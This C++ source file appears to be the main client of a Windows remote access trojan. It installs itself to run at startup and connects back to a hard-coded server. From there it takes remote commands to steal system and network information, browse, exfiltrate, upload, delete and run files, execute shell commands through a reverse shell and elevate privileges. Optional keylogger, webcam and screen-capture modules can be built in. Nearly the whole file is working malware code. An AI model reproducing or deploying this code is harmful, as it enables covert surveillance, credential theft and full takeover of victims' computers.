#include <iostream>
#include <winsock2.h>
#include <chrono>
#include <thread>
#include "video_audio/DeviceEnumerator.h"
#include <string>
#include <filesystem>
#include <shellapi.h>
#include "stream/Stream.h"
#include "download/Download.h"
#include "file/FileManager.h"
#include "information/system/SystemInformation.h"
#include "information/network/NetworkInformation.h"
#include "reverse_shell/ReverseShell.h"
#include "keyboard/KeyboardExecuter.h"
#include "permission/Permission.h"
#include "box_message/MessageBoxGUI.h"

#include "state/SystemState.h"
#include "install/Install.h"


#define IP "192.168.1.133"

#define PORT 3055

#define TAG_NAME "Client"

#define MUTEX "588bf0df-5ed3-4efa-9804-4f91767e8bb2"

#define TIMING_RETRY 10000

//#define WEBCAM "WLogs"

#ifdef WEBCAM

#include "webcam/WebcamManager.h"
#include "screen/ScreenStreamer.h"

#endif

//#define KEYLOGGER "KLogs"

#ifdef KEYLOGGER

#include "Keylogger/KeyLogger.h"

#endif

#define INSTALL_PATH (-1)

#define SUBDIRECTORY_NAME "Client"

#define SUBDIRECTORY_FILE_NAME "client.exe"

#define STARTUP_NAME "ClientStartUp"



int main(int argc,char*argv[]) {
    HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
    if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
        Install::installClient(INSTALL_PATH,argv[0],SUBDIRECTORY_NAME,SUBDIRECTORY_FILE_NAME,STARTUP_NAME);
        bool connectionState = true;
        while (connectionState) {
            std::cout << "trying to connect " << std::endl;
            WSADATA WSAData;
            WSAStartup(MAKEWORD(2, 0), &WSAData);
            SOCKET sock;
            SOCKADDR_IN sin;
            sin.sin_addr.s_addr = inet_addr(IP);
            sin.sin_family = AF_INET;
            sin.sin_port = htons(PORT);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            bool streamListening = true;
            if (connect(sock, (SOCKADDR *) &sin, sizeof(sin)) != SOCKET_ERROR) {
                std::cout << "Connected to server!" << std::endl;
                Stream stream(sock);
                ReverseShell reverseShell;
#ifdef KEYLOGGER
                KeyLogger keyLogger(stream,KEYLOGGER);
                keyLogger.tryStart();
#endif
                while (streamListening) {
                    int action = stream.readSize();
                    switch (action) {
                        case -2: {
                            connectionState = false;
                            streamListening = false;
                            break;
                        }
                        case -1: {
                            streamListening = false;
                            break;
                        }
                        case 0: {
                            std::cout << "GATHERING SYSTEM INFORMATION" << std::endl;
                            std::vector<std::string> informationVector = SystemInformation::getSystemInformation();
                            informationVector.emplace_back(TAG_NAME);
#ifdef WEBCAM
                            informationVector.emplace_back("true");
#else
                            informationVector.emplace_back("false");
#endif
#ifdef KEYLOGGER
                            informationVector.emplace_back("true");
#else
                            informationVector.emplace_back("false");
#endif
                            stream.sendList(informationVector);
                            break;
                        }
                        case 1: {
                            std::cout << "GATHERING NETWORK INFORMATION " << std::endl;
                            std::string networkJSON = NetworkInformation::requestNetworkInformation();
                            stream.sendString(networkJSON.c_str());
                            break;
                        }
                        case 2: {
                            std::cout << "JSON FOR READING DISKS" << std::endl;
                            stream.sendList(SystemInformation::getDisks());
                            break;
                        }
                        case 3: {
                            std::cout << "READING ALL" << std::endl;
                            std::string path = stream.readString();
                            std::cout << "Path -> " << path << std::endl;
                            std::string folderVector = FileManager::readDirectory(std::filesystem::u8path(path), true,
                                                                                  false);
                            std::string fileVector = FileManager::readDirectory(std::filesystem::u8path(path), false,
                                                                                true);
                            folderVector.append(fileVector);
                            std::cout << folderVector << std::endl;
                            stream.sendString(folderVector.c_str());
                            break;
                        }
                        case 4: {
                            std::cout << "READING ONLY DIRECTORIES" << std::endl;
                            std::string path = stream.readString();
                            std::string vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path), true,
                                                                                   false);
                            stream.sendString(vectorOfFiles.c_str());
                            break;
                        }
                        case 5: {
                            std::cout << "DOWNLOADING" << std::endl;
                            std::vector<std::string> fileList = stream.readList();
                            Download download(stream, fileList);
                            download.start();
                            break;
                        }
                        case 6: {
                            std::cout << "COPYING" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            std::vector<std::string> vectorOfDirectories = stream.readList();
                            FileManager::copyFiles(vectorOfFiles, vectorOfDirectories);
                            break;
                        }
                        case 7: {
                            std::cout << "MOVING" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            std::string directory = stream.readString();
                            FileManager::moveFiles(vectorOfFiles, directory);
                            break;
                        }
                        case 8: {
                            std::cout << "DELETING" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            FileManager::deleteFiles(vectorOfFiles);
                            break;
                        }
                        case 9: {
                            std::cout << "RUNNING FILES" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            FileManager::runFiles(vectorOfFiles);
                            break;
                        }
                        case 10: {
                            std::cout << "UPLOADING FILES" << std::endl;
                            std::vector<std::string> vectorOfFiles = stream.readList();
                            int numOfFiles = stream.readSize();

                            for (int i = 0; i < numOfFiles; i++) {
                                stream.readFile(vectorOfFiles);
                            }
                            break;
                        }
                        case 11: {
                            std::cout << "OPEN REVERSE SHELL " << std::endl;
                            std::string command = stream.readString();
                            std::string response;
                            response.append(reverseShell.executeCommand(Converter::string2wstring(command)));
                            stream.sendString(response.c_str());
                            break;
                        }
#ifdef KEYLOGGER
                        case 12: {
                            std::cout << "START KEYLOGGER" << std::endl;
                            keyLogger.tryStart();
                            break;
                        }
                        case 13: {
                            std::cout << "STOP KEYLOGGER" << std::endl;
                            if (keyLogger.isRecordingKeys()) keyLogger.setRecordingKeys(false);
                            break;
                        }

                        case 1401: {
                            std::cout << "DUMP KEYLOGGER LOG" << std::endl;
                            keyLogger.sendKeyLoggerLog();
                            break;
                        }
                        case 1402: {
                            std::cout << "DUMP ALL KEYLOGGER LOGS" << std::endl;
                            keyLogger.sendAllKeyLoggerLogs();
                            break;
                        }
                        case 1403: {
                            std::cout << "CHECK LAST " << std::endl;
                            stream.sendSize(keyLogger.lastLogExists());
                            break;
                        }
                        case 1404: {
                            std::cout << "CHECK ALL " << std::endl;
                            std::cout << keyLogger.logsExists();
                            stream.sendSize(keyLogger.logsExists());
                            break;
                        }
                        case 15: {
                            std::cout << "GET INFORMATION " << std::endl;
                            stream.sendSize(keyLogger.isRecordingKeys());
                            break;
                        }
#endif
                        case 16: {
                            std::cout << "REQUEST DEVICES (CAMERA)" << std::endl;
                            DeviceEnumerator de;
                            std::map<int, Device> devices = de.getVideoDevicesMap();
                            std::vector<std::string> webcamVector;
                            for (auto const &device: devices) {
                                std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
                                std::cout << "Name: " << device.second.deviceName << std::endl;
                                std::cout << "Path: " << device.second.devicePath << std::endl;
                                webcamVector.push_back(device.second.deviceName);
                            }
                            stream.sendList(webcamVector);
                            break;
                        }
#ifdef WEBCAM
                            case 17: {

                            std::cout << "START WEBCAM" << std::endl;
                            std::string webcamName = stream.readString();
                            bool fragmented = stream.readSize();
                            int FPS = stream.readSize();
                            DeviceEnumerator de;

                            std::map<int, Device> devices = de.getVideoDevicesMap();
                            for (auto &device: devices) {
                                std::cout << "== AUDIO DEVICE (id:" << device.first << ") ==" << std::endl;
                                std::cout << "Name: " << device.second.deviceName << std::endl;
                                std::cout << "Path: " << device.second.devicePath << std::endl;
                                if (device.second.deviceName == webcamName) {
                                    WebcamManager webcam(stream, device.first, fragmented, FPS,WEBCAM);
                                    webcam.startWebcam();
                                }
                            }

                            break;
                        }
#endif
                        case 18: {
                            std::cout << "keyboard command " << std::endl;
                            std::string keyboardCommand = stream.readString();
                            KeyboardExecuter keyboardExecuter(keyboardCommand);
                            std::thread keyboardThread(&KeyboardExecuter::executeSequence, &keyboardExecuter);
                            keyboardThread.detach();
                            break;
                        }
                        case 19: {
                            std::cout << "has admin permission command " << std::endl;
                            std::cout << Permission::hasAdminPermission() << std::endl;
                            stream.sendSize(Permission::hasAdminPermission());
                            break;
                        }
                        case 20: {
                            std::cout << "elevate permission" << std::endl;
                            BOOL result;
                            result = Permission::elevatePermissions();
                            if (result == 1) {
                                stream.sendSize(1);
                                return 0;
                            }
                            stream.sendSize(result);
                            break;
                        }
                        case 21: {
                            std::cout << "SHOW MESSAGE BOX " << std::endl;
                            std::string boxInformation = stream.readString();
                            MessageBoxGUI messageBox(boxInformation);
                            std::thread messageBoxThread(&MessageBoxGUI::showMessageGUI, &messageBox);
                            messageBoxThread.detach();
                            break;
                        }
#ifdef WEBCAM
                        case 22: {
                            std::cout << "SCREEN STREAM" << std::endl;
                            ScreenStreamer screenStreamer(stream);
                            screenStreamer.sendPicture();
                            break;
                        }
#endif
                        case 23: {
                            std::cout << "LOG OFF" << std::endl;
                            SystemState::setState(0);
                            break;
                        }
                        case 24: {
                            std::cout << "SHUTDOWN " << std::endl;
                            SystemState::setState(1);
                            break;
                        }
                        case 26: {
                            std::cout << "RESTART " << std::endl;
                            SystemState::setState(2);
                            break;
                        }
                        default: {

                            break;
                        }

                    }
                }
                closesocket(sock);
            }
            WSACleanup();
            std::this_thread::sleep_for(std::chrono::milliseconds(TIMING_RETRY));
        }
    }

    ReleaseMutex(hMutexHandle);
    CloseHandle(hMutexHandle);
    return 0;


}
